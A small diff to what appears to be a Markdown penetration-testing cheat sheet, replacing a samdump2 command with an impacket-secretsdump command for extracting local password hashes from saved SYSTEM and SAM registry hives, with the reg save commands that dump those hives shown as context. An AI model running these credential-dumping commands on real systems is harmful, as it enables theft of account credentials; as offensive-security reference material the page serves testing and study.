@@ -814,7 +814,7 @@ reg save hklm\system system
 reg save hklm\sam sam
 ```
 ```bash
-samdump2 system sam 
+impacket-secretsdump -system system -sam sam local
 ```
   
 </details>
